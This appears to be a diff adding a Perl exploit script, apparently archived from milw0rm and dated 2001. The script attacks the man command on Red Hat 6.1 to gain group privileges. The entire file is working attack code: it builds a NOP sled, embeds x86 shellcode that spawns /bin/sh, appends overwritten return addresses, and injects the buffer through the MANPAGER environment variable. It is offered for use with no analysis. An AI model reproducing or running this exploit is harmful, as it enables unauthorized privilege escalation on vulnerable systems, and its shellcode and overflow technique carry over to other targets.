@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+
+##  Redhat 6.1 man exploit - gives egid 15
+##  Written just for fun - teleh0r@doglover.com
+
+
+$shellcode =  "\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07".
+              "\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b".
+              "\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff".
+              "\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x01";
+
+
+$len = 4062;        # -- Sufficient to overwrite EIP.
+$nop = "\x90";      # -- x86 NOP.
+$ret = 0xbfffbb24;  # -- ESP / Return value.
+$offset = -800;     # -- Default offset to try.
+
+
+if (@ARGV == 1) {
+    $offset = $ARGV[0];
+}
+
+for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
+    $buffer .= $nop;
+}
+
+# [ Buffer: NNNNNNNNNNNNNN ]
+
+# Add the shellcode to the buffer.
+
+$buffer .= $shellcode;
+
+# [ Buffer: NNNNNNNNNNNNNNSSSSS ]
+
+$address = sprintf('%lx', ($ret + $offset));
+$new_ret = pack('l', ($ret + $offset));
+
+print("Address: 0x$address / Offset: $offset\n");
+sleep(1);
+
+# Fill the rest of the buffer (length 100) with RET's.
+
+for ($i += length($shellcode); $i < $len; $i += 4) {
+    $buffer .= $new_ret;
+}
+
+# [ Buffer: NNNNNNNNNNNNNNNNSSSSSRRRRRR ]
+
+local($ENV{'MANPAGER'}) = $buffer; exec("/usr/bin/man id");
+
+
+# milw0rm.com [2001-01-19]
